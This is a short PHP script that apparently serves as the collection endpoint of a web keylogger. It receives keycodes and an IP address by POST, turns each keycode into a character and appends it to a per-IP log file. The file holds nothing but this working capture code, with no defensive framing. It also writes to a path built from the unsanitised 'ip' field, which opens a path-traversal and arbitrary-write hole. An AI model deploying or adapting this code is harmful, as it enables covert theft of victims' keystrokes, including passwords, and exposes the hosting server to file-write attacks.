<?php
require_once 'configs.php';

$keycode = $_POST['key'];
$ip = $_POST['ip'];
$char = chr($keycode);
$data = mb_convert_encoding($char, 'UTF-8');
file_put_contents($path.'file_'.$ip.'.log', $data, FILE_APPEND);